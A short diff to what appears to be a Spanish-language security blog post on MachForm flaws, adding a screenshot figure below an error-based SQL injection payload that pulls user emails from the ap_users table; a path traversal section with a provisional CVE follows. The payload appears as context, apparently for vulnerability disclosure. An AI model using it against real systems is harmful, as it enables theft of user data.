@@ -60,6 +60,10 @@ Which is the *base64* encoding for:
 ```sql
 el= (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x2020,(SELECT MID((user_email),1,50) FROM ap_users ORDER BY user_id LIMIT 0,1),0x2020,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) ;&id=1&hash=1&form_id=1
 ```
+<figure class="align-center">
+  <img class="align-center" style="width: auto" src="{{ site.url }}{{ site.baseurl }}/assets/images/MachForm-not-0-day/sqli.png" alt="">
+  <figcaption style="text-align: center">Ejecución parada</figcaption>
+</figure>
 
 ## Path traversal 
 (Provisional CVE-2018-6409)
